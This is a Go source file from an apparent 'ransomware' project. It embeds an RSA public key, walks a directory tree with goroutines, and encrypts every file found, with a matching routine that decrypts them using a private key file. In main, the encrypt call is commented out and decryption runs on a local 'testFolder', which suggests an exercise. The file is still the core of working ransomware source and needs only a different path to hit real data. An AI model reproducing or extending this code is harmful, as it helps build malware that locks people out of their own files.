package main

import (
	"io/fs"
	"os"
	"path/filepath"
	"ransomware/io"
	"sync"
)

var (
	pubKeyPem = []byte(`-----BEGIN RSA PUBLIC KEY-----
MIIBCgKCAQEArZFHr8S/XO5Lzr/3oVtWCF07UEpFEf5v3B/QhftkZG/vyKl1k5Qo
AmODlQ0WL3cE5xbL4apJooNP1Cmho7SbmZ2z9yOZWDlkI5mF11Dn7RsvRATVdWOc
jXqRx5/CfPfUcN7eMYdUpQ/q7XWgnT2gaFuFFNlnI+0HpEZw/Ncbu/0DJQ1SIbuH
InxveKJPQZEZkAlFESbAzwayYO8a1SkcctlCljV/cCoRmYbO1rxlOyIoZPQ3GPNF
gx2OnSXMC0aDiDYcT+tifBURuQUTw/qe3wqVfvzrGNvHU+c/Z85hUMwhSB8lpfRo
tr1zd788DLQbesmVBKCANqdanyLnsUtVjQIDAQAB
-----END RSA PUBLIC KEY-----
`)
	publicKey  = io.DecodePublicKey(pubKeyPem)
	privateKey = io.ReadPrivateKey("privateKey.pem")
	waitGroup  sync.WaitGroup

	filesToVisit = make(chan io.File)
)

func main() {

	currentDirectory, _ := os.Getwd()

	// encryptFiles(string(currentDirectory + "/testFolder"))
	decryptFiles(string(currentDirectory + "/testFolder"))

	waitGroup.Wait()

}

func encryptFiles(dirPath string) {

	waitGroup.Add(1)
	go func() {
		filepath.WalkDir(dirPath, func(path string, d fs.DirEntry, err error) error {
			if !d.IsDir() {
				info, err := d.Info()
				if err != nil {
					return err
				}

				filesToVisit <- io.File{Info: info, Path: path, Extension: ""}
			}
			return nil
		})

		defer close(filesToVisit)
		defer waitGroup.Done()
	}()

	waitGroup.Add(1)
	go func() {
		for file := range filesToVisit {
			file.Encrypt(publicKey)
		}
		defer waitGroup.Done()
	}()
}

func decryptFiles(dirPath string) {

	waitGroup.Add(1)
	go func() {
		filepath.WalkDir(dirPath, func(path string, d fs.DirEntry, err error) error {
			if !d.IsDir() {
				info, err := d.Info()
				if err != nil {
					return err
				}

				filesToVisit <- io.File{Info: info, Path: path, Extension: ""}
			}
			return nil
		})

		defer close(filesToVisit)
		defer waitGroup.Done()
	}()

	waitGroup.Add(1)
	go func() {
		for file := range filesToVisit {
			file.Decrypt(privateKey)
		}
		defer waitGroup.Done()
	}()
}
